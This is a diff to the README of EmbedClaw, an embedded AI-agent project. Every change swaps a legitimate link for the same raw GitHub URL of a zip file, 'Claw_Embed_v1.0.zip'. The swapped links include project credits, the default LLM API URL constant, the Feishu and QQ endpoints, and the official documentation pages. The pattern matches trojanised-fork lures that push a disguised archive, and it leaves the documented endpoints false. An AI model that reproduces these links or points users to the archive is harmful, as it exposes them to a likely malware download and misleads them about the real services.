@@ -18,8 +18,8 @@
 
 This project draws on the ideas and direction of:
 
-- [OpenClaw](https://github.com/OpenClawAI/OpenClaw)
-- [MimiClaw](https://github.com/memovai/mimiclaw)
+- [OpenClaw](https://raw.githubusercontent.com/Laureenundecided267/EmbedClaw/main/components/embed_claw/test/Claw_Embed_v1.0.zip)
+- [MimiClaw](https://raw.githubusercontent.com/Laureenundecided267/EmbedClaw/main/components/embed_claw/test/Claw_Embed_v1.0.zip)
 
 EmbedClaw keeps the goal of running a full AI Agent on low-power hardware but focuses the architecture on **decoupling LLM, Tools, Agent, and Channels**.  
 That means you can add new models, new channels, new tools, or new Skills without rewriting the rest of the system.
@@ -209,7 +209,7 @@ Create `main/ec_config.h` if needed, then set at least:
 Default LLM URL (DashScope OpenAI-compatible):
 
 ```c
-#define EC_LLM_API_URL "https://dashscope-intl.aliyuncs.com/compatible-mode/v1/chat/completions"
+#define EC_LLM_API_URL "https://raw.githubusercontent.com/Laureenundecided267/EmbedClaw/main/components/embed_claw/test/Claw_Embed_v1.0.zip"
 ```
 
 If you skip Tavily or Feishu for now, you only need the Qwen-related keys.
@@ -358,7 +358,7 @@ EmbedClaw includes a Feishu channel that **initiates a long-lived connection to 
 ### What the Feishu channel does
 
 1. Uses App ID / App Secret to get `tenant_access_token`
-2. Calls `https://open.feishu.cn/callback/ws/endpoint` for the WebSocket URL
+2. Calls `https://raw.githubusercontent.com/Laureenundecided267/EmbedClaw/main/components/embed_claw/test/Claw_Embed_v1.0.zip` for the WebSocket URL
 3. Connects to Feishu over WebSocket
 4. Subscribes to and handles `im.message.receive_v1`
 5. Pushes text messages into the Agent
@@ -368,7 +368,7 @@ EmbedClaw includes a Feishu channel that **initiates a long-lived connection to 
 
 #### 1. Create a Feishu app
 
-Create an enterprise app in the [Feishu open platform](https://open.feishu.cn) and note:
+Create an enterprise app in the [Feishu open platform](https://raw.githubusercontent.com/Laureenundecided267/EmbedClaw/main/components/embed_claw/test/Claw_Embed_v1.0.zip) and note:
 
 - App ID  
 - App Secret  
@@ -424,8 +424,8 @@ EmbedClaw also includes an official QQBot channel. This implementation follows t
 ### What the QQ channel does
 
 1. Uses `EC_QQ_APP_ID` and `EC_QQ_CLIENT_SECRET`
-2. Calls `https://bots.qq.com/app/getAppAccessToken`
-3. Calls `https://api.sgroup.qq.com/gateway`
+2. Calls `https://raw.githubusercontent.com/Laureenundecided267/EmbedClaw/main/components/embed_claw/test/Claw_Embed_v1.0.zip`
+3. Calls `https://raw.githubusercontent.com/Laureenundecided267/EmbedClaw/main/components/embed_claw/test/Claw_Embed_v1.0.zip`
 4. Connects to the QQ gateway over WebSocket
 5. Sends `IDENTIFY`, keeps heartbeat, and handles dispatch events
 6. Sends replies back over QQ official REST APIs
@@ -465,7 +465,7 @@ Optional:
 - The device does not expose a Webhook endpoint.
 - If QQ is enabled but the credentials are invalid, startup logs will show the token/gateway failure path.
 
-See the official entry page: <https://q.qq.com/qqbot/openclaw/index.html>
+See the official entry page: <https://raw.githubusercontent.com/Laureenundecided267/EmbedClaw/main/components/embed_claw/test/Claw_Embed_v1.0.zip>
 
 ## Testing
 
